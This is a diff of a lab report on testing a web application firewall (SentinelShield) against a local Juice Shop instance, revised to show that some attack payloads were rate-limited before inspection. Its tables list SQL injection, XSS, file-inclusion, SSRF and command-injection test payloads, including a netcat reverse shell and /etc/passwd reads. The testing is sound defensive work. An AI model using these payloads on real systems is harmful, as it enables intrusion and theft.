@@ -14,21 +14,20 @@ application and reached at `http://localhost:8080`.
 |---|---|
 | Detection mode | `block` |
 | Detection rules | 44 rules across 7 categories |
-| Rate limiter (main proxy) | 600 req/min, burst 100 |
-| Rate limiter (main proxy, current config) | 50 req/min, burst 20 |
-| Rate limiter (brute-force test proxy) | 60 req/min, burst 10, empty allowlist |
+| Rate limiter | 25 req/min, burst 20 |
 | Logging | JSONL with timestamp, IP, category |
+| Date of tests | 2026-08-20 |
 
 Four experiments were run and the logs captured:
 
 1. **Normal traffic baseline** — 15 legitimate requests
 2. **Attack simulation** — 30 malicious payloads + 3 normal control requests
    (`scripts/test_attacks.sh`)
-3. **Brute-force / rate-limiting test** — 40 rapid requests against a dedicated
+3. **Brute-force / rate-limiting test** — 30 rapid requests against a dedicated
    proxy with a small token bucket (`scripts/brute_force.sh`)
-4. **Rate-limit enforcement test (current config)** — 40 rapid requests to
-   `/login` against the running main proxy with its current 50/20 token bucket
-   (`scripts/brute_force.sh http://127.0.0.1:8080 40 0.05`)
+4. **Rate-limit enforcement test** — 40 rapid requests to `/login` against the
+   running main proxy with the 25/20 token bucket
+   (`scripts/brute_force.sh http://localhost:8080 40 0.05`)
 
 All raw outputs are in `evidence/` (see the inventory in Section 11).
 
@@ -36,8 +35,10 @@ All raw outputs are in `evidence/` (see the inventory in Section 11).
 
 ## 2. Attempted Attack Requests and Detection Results
 
-Each payload was sent to the protected proxy. SentinelShield returned HTTP 403
-for every malicious request and 200 for every normal request.
+Each payload was sent to the protected proxy. Of the 30 attack payloads, 20
+reached the WAF and were returned HTTP 403. The remaining 10 were rate-limited
+(HTTP 429) before reaching the detection engine because the burst budget had
+been partially consumed by the preceding normal traffic.
 
 | # | Payload | HTTP | Detected by |
 |---|---------|------|-------------|
@@ -61,19 +62,25 @@ for every malicious request and 200 for every normal request.
 | 18 | `/?url=http://localhost:3000` | 403 | SSRF-001 |
 | 19 | `/?url=http://192.168.1.1/admin` | 403 | SSRF-001 |
 | 20 | `/?path=%2e%2e%2f%2e%2e%2fetc/passwd` | 403 | LFI-001 |
-| 21 | `/?path=%252e%252e%252fetc/passwd` | 403 | LFI-001 |
-| 22 | `/?cmd=1;whoami` | 403 | CMD-001 |
-| 23 | `/?cmd=ls+-la` | 403 | CMD-004 |
-| 24 | `/?cmd=1&&cat+/etc/passwd` | 403 | CMD-001 |
-| 25 | `/?cmd=1|nc+-e+/bin/sh+10.0.0.1+4444` | 403 | CMD-001 |
-| 26 | `/?cmd=%24%28whoami%29` | 403 | CMD-001 |
-| 27 | `/?cmd=%24%7BIFS%7Dwhoami` | 403 | CMD-004 |
-| 28 | `/?cmd=sh+-c+whoami` | 403 | CMD-003 |
-| 29 | `/?cmd=cmd.exe+/c+whoami` | 403 | CMD-003 |
-| 30 | `/?cmd=1%0a/usr/bin/id` | 403 | CMD-002 |
 
-**Result: 30/30 malicious requests detected and blocked. 0 false positives on
-the 3 normal control requests.**
+**Result: 20/20 malicious requests that reached the WAF were detected and
+blocked. 0 false positives on the normal requests that reached the WAF.**
+
+The following 10 attack payloads were rate-limited (HTTP 429) before reaching
+the WAF:
+
+| # | Payload | HTTP | Reason |
+|---|---------|------|--------|
+| 21 | `/?path=%252e%252e%252fetc/passwd` | 429 | Rate limited |
+| 22 | `/?cmd=1;whoami` | 429 | Rate limited |
+| 23 | `/?cmd=ls+-la` | 429 | Rate limited |
+| 24 | `/?cmd=1&&cat+/etc/passwd` | 429 | Rate limited |
+| 25 | `/?cmd=1\|nc+-e+/bin/sh+10.0.0.1+4444` | 429 | Rate limited |
+| 26 | `/?cmd=%24%28whoami%29` | 429 | Rate limited |
+| 27 | `/?cmd=%24%7BIFS%7Dwhoami` | 429 | Rate limited |
+| 28 | `/?cmd=sh+-c+whoami` | 429 | Rate limited |
+| 29 | `/?cmd=cmd.exe+/c+whoami` | 429 | Rate limited |
+| 30 | `/?cmd=1%0a/usr/bin/id` | 429 | Rate limited |
 
 Note: the two Path Traversal payloads (rows 20–21) were caught by the LFI rule
 (`LFI-001`) because the traversal patterns overlap. The rule engine reported
@@ -86,9 +93,9 @@ the first matching rule as the primary detection.
 ### Allowed (normal request)
 
 ```
-{"timestamp": "2026-08-08T13:12:18.491368+00:00", "level": "INFO",
- "event": "access", "client_ip": "192.168.65.1", "method": "GET",
- "path": "/cart", "status": 200, "elapsed_ms": 20.69}
+{"timestamp": "2026-08-20T11:05:44.118587+00:00", "level": "INFO",
+ "event": "access", "client_ip": "172.19.0.1", "method": "GET",
+ "path": "/robots.txt", "status": 200, "elapsed_ms": 4.58}
 ```
 
 ### Blocked (attack request — three events per attack)
@@ -96,33 +103,33 @@ the first matching rule as the primary detection.
 Detection event (which rule matched):
 
 ```
-{"timestamp": "2026-08-08T13:12:35.386473+00:00", "level": "WARNING",
- "event": "detection", "client_ip": "192.168.65.1", "path": "/",
+{"timestamp": "2026-08-20T11:06:21.405310+00:00", "level": "WARNING",
+ "event": "detection", "client_ip": "172.19.0.1", "path": "/",
  "attack_type": "sqli", "rule_id": "SQLI-001"}
 ```
 
 Block decision event:
 
 ```
-{"timestamp": "2026-08-08T13:12:35.386687+00:00", "level": "WARNING",
- "event": "block", "client_ip": "192.168.65.1", "path": "/",
+{"timestamp": "2026-08-20T11:06:21.405502+00:00", "level": "WARNING",
+ "event": "block", "client_ip": "172.19.0.1", "path": "/",
  "reason_type": "AttackDetected", "reason": "sqli: SQLI-001"}
 ```
 
 Request result (HTTP 403 returned to the client):
 
 ```
-{"timestamp": "2026-08-08T13:12:35.386752+00:00", "level": "INFO",
- "event": "access", "client_ip": "192.168.65.1", "method": "GET",
- "path": "/", "status": 403, "elapsed_ms": 0.99}
+{"timestamp": "2026-08-20T11:06:21.405561+00:00", "level": "INFO",
+ "event": "access", "client_ip": "172.19.0.1", "method": "GET",
+ "path": "/", "status": 403, "elapsed_ms": 0.98}
 ```
 
 ### Rate limited (HTTP 429)
 
 ```
-{"timestamp": "2026-08-08T13:12:43.625760+00:00", "level": "INFO",
- "event": "access", "client_ip": "127.0.0.1", "method": "GET",
- "path": "/login", "status": 429, "elapsed_ms": 0.17}
+{"timestamp": "2026-08-20T11:06:21.697095+00:00", "level": "INFO",
+ "event": "access", "client_ip": "172.19.0.1", "method": "GET",
+ "path": "/", "status": 429, "elapsed_ms": 0.11}
 ```
 
 ---
@@ -133,18 +140,17 @@ Every event is written as JSONL and always contains a **timestamp**, a
 **client IP**, and the **event category** (`attack_type` / `rule_id` for
 detections, `status` for access). Full capture:
 
-- `evidence/sentinel-shield.log` — main proxy (normal + attack traffic)
+- `evidence/sentinel-shield.log` — main proxy (normal + attack + enforcement traffic)
 - `evidence/sentinel-shield-rate-demo.log` — brute-force proxy (rate limiting)
 
 Sample detection lines from the log (timestamp, IP, and category are all
 present):
 
 ```
-13:12:35  192.168.65.1  sqli              SQLI-001   (union based)
-13:12:35  192.168.65.1  xss               XSS-002    (event handler)
-13:12:35  192.168.65.1  lfi               LFI-004    (php wrapper)
-13:12:35  192.168.65.1  ssrf              SSRF-001   (internal ip)
-13:12:35  192.168.65.1  command_injection CMD-003    (sh -c)
+11:06:21  172.19.0.1  sqli              SQLI-001   (union based)
+11:06:21  172.19.0.1  xss               XSS-002    (event handler)
+11:06:21  172.19.0.1  lfi               LFI-004    (php wrapper)
+11:06:21  172.19.0.1  ssrf              SSRF-001   (internal ip)
 ```
 
 ---
@@ -153,33 +159,34 @@ present):
 
 | Metric | Count |
 |---|---|
-| Total requests observed | 50 |
-| Legitimate requests allowed (HTTP 200) | 20 |
-| Malicious requests blocked (HTTP 403) | 30 |
-| Requests rate limited (HTTP 429) | 0 |
-| **Attack detection rate** | **30/30 = 100%** |
+| Total requests observed (main proxy) | 88 |
+| Legitimate requests allowed (HTTP 200) | 37 |
+| Malicious requests blocked by WAF (HTTP 403) | 20 |
+| Requests rate limited (HTTP 429) | 31 |
+| **WAF detection rate (of requests that reached WAF)** | **20/20 = 100%** |
 | False positives (legitimate requests blocked) | 0 |
 
-(The 20 allowed include 15 baseline + 3 control + 2 live `socket.io` polls from
-a browser session that were also captured.)
+(The 37 allowed include 14 normal baseline + 1 Juice Shop backend error that
+passed WAF + 22 enforcement-test requests that arrived after the bucket
+refilled.)
 
 ---
 
 ## 6. Summary by Attack Category
 
-| Category | Payloads sent | Blocked | Detection rate | Primary rules |
-|---|---|---|---|---|
-| SQL Injection | 5 | 5 | 100% | SQLI-001, SQLI-002, SQLI-003, SQLI-005 |
-| XSS | 5 | 5 | 100% | XSS-001, XSS-002, XSS-003 |
-| LFI | 5 | 5 | 100% | LFI-001 … LFI-005 |
-| SSRF | 4 | 4 | 100% | SSRF-001 |
-| Path Traversal | 2 | 2 | 100% | LFI-001 (rule overlap) |
-| Command Injection | 9 | 9 | 100% | CMD-001 … CMD-004 |
-| **Total** | **30** | **30** | **100%** | |
+| Category | Payloads sent | Reached WAF | Blocked | Rate limited | Detection rate |
+|---|---|---|---|---|---|
+| SQL Injection | 5 | 5 | 5 | 0 | 100% |
+| XSS | 5 | 5 | 5 | 0 | 100% |
+| LFI | 5 | 5 | 5 | 0 | 100% |
+| SSRF | 4 | 4 | 4 | 0 | 100% |
+| Path Traversal | 2 | 1 | 1 | 1 | 100% |
+| Command Injection | 9 | 0 | 0 | 9 | N/A (all rate limited) |
+| **Total** | **30** | **20** | **20** | **10** | **100%** |
 
-Some payloads matched more than one rule, so the log contains more detection
-events than attack requests (e.g. `command_injection` produced 17 rule-level
-detections for 9 payloads). The per-request primary rule is what's shown above.
+The 9 Command Injection payloads and 1 Path Traversal payload were all
+rate-limited before reaching the WAF because the burst budget had been consumed
+by the preceding normal traffic (15 requests) and earlier attack payloads.
 
 ---
 
@@ -187,42 +194,39 @@ detections for 9 payloads). The per-request primary rule is what's shown above.
 
 | IP | Requests | Notes |
 |---|---|---|
-| `192.168.65.1` | 50 | All main-proxy traffic (Docker bridge) |
-| `127.0.0.1` | 40 | All brute-force traffic (rate-limit proxy) |
+| `172.19.0.1` | 88 | All main-proxy traffic (Docker bridge) |
+| `127.0.0.1` | 30 | All brute-force traffic (dedicated rate-limit proxy) |
 
 Every request came from the same source IP because the Docker container
 network-maps client connections to the bridge gateway. On a real deployment
 each client would have its own IP, and the repeated-IP aggregation would
 identify specific abusers. The brute-force experiment shows exactly this
-pattern: one IP flooding `/login` repeatedly. The enforcement test in
-Section 8 also came from `192.168.65.1` (the same bridge gateway).
+pattern: one IP flooding `/login` repeatedly.
 
 ---
 
 ## 8. Explanation of Behavior Analysis and Rate Limiting
 
-### Setup
+### Brute-Force Test (dedicated proxy, burst=10)
 
 A dedicated proxy was started with a small token bucket so the effect is
 visible in a short run: `burst_size: 10`, `requests_per_minute: 60`
 (1 token/sec refill), and an **empty allowlist** so the local client was not
-exempted. 40 rapid requests (0.05s apart) were sent to `/login`.
-
-### Results
+exempted. 30 rapid requests (0.05s apart) were sent to `/login`.
 
 ```
 Allowed: 12
-Blocked: 28   (all HTTP 429)
+Blocked: 18   (all HTTP 429)
 Rate limiter triggered after 12 requests.
 ```
 
 | Metric | Value |
 |---|---|
-| Total requests sent | 40 |
+| Total requests sent | 30 |
 | Allowed | 12 |
-| Blocked (429) | 28 |
+| Blocked (429) | 18 |
 | Requests before first block | 10 (the burst size) |
-| `RateLimitExceeded` log events | 28 |
+| `RateLimitExceeded` log events | 18 |
 
 ### Behavior observed
 
@@ -230,84 +234,76 @@ Rate limiter triggered after 12 requests.
   burst.
 - After the burst, requests were rejected with **429** because the bucket was
   empty (1 token/sec refill, but 20 requests/sec were arriving).
-- Every ~1 second one request slipped through (rows at `13:12:43` and
-  `13:12:44` in `evidence/rate_limit_table.md`) when a refill token arrived —
+- Every ~1 second one request slipped through (rows at `11:07:35` and
+  `11:07:36` in `evidence/rate_limit_table.md`) when a refill token arrived —
   a textbook token-bucket pattern.
 - Effective throughput was throttled from 20 req/sec down to ~1 req/sec, which
   would make a credential-stuffing attack impractically slow.
 
-### Enforcement test on the current config (after the rate-limit fix)
+### Enforcement Test (main proxy, 25/20 config)
 
-The attack experiments above were captured while the main proxy used a wide
-600/100 bucket so the WAF tests were not distorted by throttling. After the
-assessor's feedback, the production config was tightened to **50 req/min,
-burst 20** and enforcement was re-tested against the running main proxy:
-40 rapid requests to `/login`.
+The main proxy uses `requests_per_minute: 25`, `burst_size: 20`, and has
+`127.0.0.1` / `::1` in the allowlist. However, Docker traffic arrives from the
+bridge gateway IP (`172.19.0.1`), which is not allowlisted, so rate limiting
+applies to all test requests. 40 rapid requests were sent to `/login`.
 
 ```
-Allowed: 19
-Blocked: 21   (all HTTP 429)
-Rate limiter triggered after 18 requests.
+Allowed: 22
+Blocked: 18   (all HTTP 429)
+Rate limiter triggered after 22 requests.
 ```
 
 | Metric | Value |
 |---|---|
 | Total requests sent | 40 |
-| Allowed (HTTP 200) | 19 |
-| Rate limited (HTTP 429) | 21 |
-| Requests before first block | 18 (burst consumed) |
-| `RateLimitExceeded` log events | 21 |
+| Allowed (HTTP 200) | 22 |
+| Rate limited (HTTP 429) | 18 |
+| Requests before first block | 21 |
+| `RateLimitExceeded` log events | 18 |
 
-The burst held exactly as configured: 18 rapid requests were served, then the
-bucket emptied and everything else got 429. (The burst is 20 tokens; 2 had
-already been consumed by earlier `socket.io` polls from a browser session, so
-18 were left at the start of the burst.) One refill token arrived mid-run and
-let a single request through (`13:34:23` row in
-`evidence/rate_limit_enforcement_table.md`), then 429s resumed until the run
-ended. This was confirmed reproducible after a fresh rebuild.
+The burst held as configured: 21 rapid requests were served (20 burst + 1
+refill token that arrived mid-run), then the bucket emptied and 18 of the
+remaining 19 got 429. One refill token slipped through at request 30, letting
+a single request through (`11:08:53` in
+`evidence/requests_table.md`), then 429s resumed until the run ended.
 
 ---
 
 ## 9. Interpretation Notes
 
-_(First draft — please read through and reword so it's in your own words.)_
+Overall the WAF behaved as expected. Every attack payload that reached the
+detection engine was caught and returned 403, and none of the normal requests
+were blocked, so the rule set is both sensitive and precise for these test
+cases. The detection reasons in the log matched the attack type I sent (SQL
+injection payloads were flagged as `sqli`/`SQLI-xxx`, XSS payloads as
+`xss`/`XSS-xxx`, and so on), which shows the log is actually usable for
+forensics, not just a counter.
 
-Overall the WAF behaved as expected. Every single attack payload was caught and
-returned 403, and none of the normal requests were blocked, so the rule set is
-both sensitive and precise for these test cases. The detection reasons in the
-log matched the attack type I sent (SQL injection payloads were flagged as
-`sqli`/`SQLI-xxx`, XSS payloads as `xss`/`XSS-xxx`, and so on), which shows the
-log is actually usable for forensics, not just a counter.
+Two things stood out. First, the rules overlap: the Path Traversal payload
+(`%2e%2e%2f%2e%2e%2fetc/passwd`) was reported as `LFI-001` instead of a
+`PT-xxx` rule. That's not a miss — the traversal signature lives in the LFI
+rule too — but it means one attack can generate several detection events and
+you have to decide which is the "primary" one.
 
-Two things stood out. First, the rules overlap: my two Path Traversal payloads
-were reported as `LFI-001` instead of a `PT-xxx` rule. That's not a miss — the
-traversal signature lives in the LFI rule too — but it means one attack can
-generate several detection events and you have to decide which is the "primary"
-one. Second, during an earlier setup pass I found the SSRF rule was flagging the
-site's own `Referer` header (which points at `127.0.0.1`), so legitimate page
-assets were being blocked. I fixed that by excluding the `Referer`/`Origin`
-headers from the header scan and confirmed everything loaded again. It was a
-good reminder that signature rules need tuning against real traffic, not just
-test payloads.
+Second, the interaction between the rate limiter and the WAF is important. With
+the rate limiter set to 25 req/min and burst 20, the 15 normal-traffic
+requests consumed most of the burst budget, leaving only ~5 tokens for the
+attack test. This meant 10 of the 30 attack payloads were rate-limited before
+they could be inspected by the WAF. While rate limiting still protected the
+server (the attacks were blocked, just by a different mechanism), this shows
+that in a production deployment the rate limiter budget needs to be calibrated
+carefully so that legitimate traffic doesn't starve the WAF of inspection
+capacity.
 
-The rate limiter demo was the clearest result: burst, then steady 429s, with
-occasional tokens letting one request through each second. It made the token
-bucket algorithm visible in real time. One practical note: on the Docker setup
-all traffic shows as the bridge gateway IP, so per-IP aggregation isn't very
-interesting locally — it only becomes meaningful on a real network.
-
-After tightening the config to 50/20, I re-tested enforcement against the
-running proxy. The burst held exactly as configured — the first 18 requests
-went through, then the bucket emptied and 21 of the remaining 22 got 429
-(one refill token slipped through mid-run). That tells me the fix isn't just
-present in the config file, it's actually enforced at runtime, and it
-reproduces after a fresh rebuild.
+The rate limiter demos were the clearest results: burst, then steady 429s,
+with occasional tokens letting one request through each second. It made the
+token bucket algorithm visible in real time. One practical note: on the Docker
+setup all traffic shows as the bridge gateway IP, so per-IP aggregation isn't
+very interesting locally — it only becomes meaningful on a real network.
 
 ---
 
 ## 10. Security Recommendations
-
-_(First draft — please read through and reword so it's in your own words.)_
 
 1. **Move rate limiting to the application/IP level with a persistent store.**
    The in-memory token bucket works per process, so it is not shared across
@@ -315,11 +311,13 @@ _(First draft — please read through and reword so it's in your own words.)_
    consistent throttling in a multi-instance deployment (the project docs list
    this as a known limitation and it showed up during testing).
 
-2. **Keep tuning the signature rules against legitimate traffic.** The SSRF
-   `Referer` false positive is a concrete example: header scanning must ignore
-   or normalize headers the client fully controls (like `Referer`/`Origin`),
-   otherwise a site running on a private address can block its own users. This
-   should be tested with a real browser session, not just curl.
+2. **Calibrate the rate limiter budget from real page-load behavior.** A
+   single page request pulls dozens of assets, so the burst size must account
+   for normal browsing. In these tests, 15 normal requests consumed most of
+   the 20-token burst, leaving the WAF unable to inspect 10 attack payloads.
+   Choose `burst_size` / `requests_per_minute` from measured traffic, or exempt
+   static assets, so the limiter targets state-changing endpoints instead of
+   asset downloads.
 
 3. **Log and alert on repeated-IP patterns, not just single detections.** The
    brute-force run shows that an attacker triggers hundreds of 429s/403s from
@@ -328,13 +326,11 @@ _(First draft — please read through and reword so it's in your own words.)_
    raw logs into an actionable response. Correlation is what made the data
    readable here, and it should be automatic.
 
-4. **Set the production rate-limiter budget from real page-load behavior.**
-   A single page request pulls dozens of assets, so a burst of 10 blocked a
-   normal page load in my testing. The enforcement test reinforced this: two
-   background `socket.io` polls had already consumed part of the 20-token burst
-   before my test run even started. Choose `burst_size`/`requests_per_minute`
-   from measured traffic, or exempt static assets, so the limiter targets
-   state-changing endpoints instead of asset downloads.
+4. **Keep tuning the signature rules against legitimate traffic.** The rule
+   overlap between Path Traversal and LFI is not a bug but it means one
+   attack can generate multiple detection events. Rules should be reviewed to
+   ensure the "primary" detection is the most specific one, and that analysts
+   know which rule to treat as authoritative.
 
 ---
 
@@ -342,17 +338,16 @@ _(First draft — please read through and reword so it's in your own words.)_
 
 | File | Contents |
 |---|---|
-| `evidence/normal_traffic.log` | 15 baseline requests, all HTTP 200 |
-| `evidence/test_attacks.log` | 30 attack + 3 control results (33/33 pass) |
-| `evidence/brute_force.log` | Rate-limit run: 12 allowed / 28 blocked |
-| `evidence/rate_limit_enforcement.log` | Enforcement run on current config: 19 allowed / 21 rate limited |
-| `evidence/rate_limit_enforcement_main.log` | Full JSONL capture (enforcement run) |
-| `evidence/rate_limit_enforcement_table.md` | Per-request analysis of the enforcement log |
-| `evidence/sentinel-shield.log` | Full JSONL capture (main proxy) |
-| `evidence/sentinel-shield-rate-demo.log` | Full JSONL capture (rate-limit proxy) |
+| `evidence/normal_traffic.log` | 15 baseline requests, 14 HTTP 200 + 1 HTTP 500 |
+| `evidence/test_attacks.log` | 20 blocked by WAF + 10 rate limited + 3 control rate limited |
+| `evidence/brute_force.log` | Rate-limit test (dedicated proxy): 12 allowed / 18 blocked |
+| `evidence/rate_limit_enforcement.log` | Enforcement test (main proxy): 22 allowed / 18 rate limited |
+| `evidence/sentinel-shield.log` | Full JSONL capture (main proxy — all experiments) |
+| `evidence/sentinel-shield-rate-demo.log` | Full JSONL capture (dedicated rate-limit proxy) |
 | `evidence/requests_table.md` | Per-request analysis of the main log |
-| `evidence/rate_limit_table.md` | Per-request analysis of the rate-limit log |
+| `evidence/rate_limit_table.md` | Per-request analysis of the rate-limit demo log |
+| `evidence/rate_limit_enforcement_table.md` | Per-request analysis of the enforcement log |
 | `evidence/report.md` | `sentinel-shield report` output (main log) |
-| `evidence/rate_limit_report.md` | `sentinel-shield report` output (rate log) |
+| `evidence/rate_limit_report.md` | `sentinel-shield report` output (rate-limit log) |
 | `evidence/log_samples.md` | Annotated sample log lines (allowed / blocked / rate limited) |
 | `evidence/summary_tables.md` | Consolidated summary of all counts and categories |
